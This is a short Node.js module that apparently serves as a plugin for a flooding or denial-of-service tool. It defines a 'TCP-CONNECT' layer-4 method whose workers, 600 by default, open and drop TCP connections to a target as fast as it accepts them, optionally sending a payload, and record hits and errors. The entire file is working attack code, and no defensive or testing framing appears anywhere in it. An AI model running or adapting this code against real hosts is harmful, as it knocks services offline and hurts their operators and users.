'use strict';
const net = require('net');

module.exports = {
  name: 'TCP-CONNECT',
  layer: 4,
  summary: 'Opens and drops raw TCP connections as fast as the target can accept them.',
  defaults: { concurrency: 600 },
  create(ctx) {
    const { target, stats, opts } = ctx;
    const payload = opts.payload ? Buffer.from(opts.payload) : null;
    const host = target.ip || target.host;

    return {
      async worker() {
        while (ctx.running) {
          await new Promise((resolve) => {
            const sock = net.connect({ host, port: target.port });
            stats.open();

            let settled = false;
            const done = (err) => {
              if (settled) return;
              settled = true;
              stats.close();
              if (err) stats.err(); else stats.hit(payload ? payload.length : 0);
              try { sock.destroy(); } catch {}
              resolve();
            };

            sock.on('connect', () => {
              if (payload) { try { sock.write(payload); } catch {} }
              done(null);
            });
            sock.on('error', () => done(new Error('tcp')));
            sock.setTimeout(Number(opts.socketTimeout) || 8000, () => done(new Error('timeout')));
          });
        }
      },
    };
  },
};
